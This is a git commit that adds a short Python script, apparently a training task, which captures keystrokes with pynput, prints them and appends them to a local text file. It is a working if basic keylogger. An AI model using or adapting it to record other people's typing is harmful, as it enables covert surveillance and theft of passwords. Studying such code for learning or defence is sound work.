e4046886433659c843a1fdb1d1a7558e76451904
Angel <sonarobert1006@gmail.com>
2024-09-19 20:51:31 +0530

    Update Task_04.py

--- Task_04.py
+++ Task_04.py
@@ -1,1 +1,13 @@
+from pynput import keyboard
 
+def keyPressed(key):
+  print(str(key))
+  with open("keyfile.txt",'a') as logKey:
+    try:
+      char=key.char
+      logKey.write(char)
+    except:
+      print("Error getting char")
+listener=keyboard.Listener(on_press=keyPressed)
+listener.start()
+input()
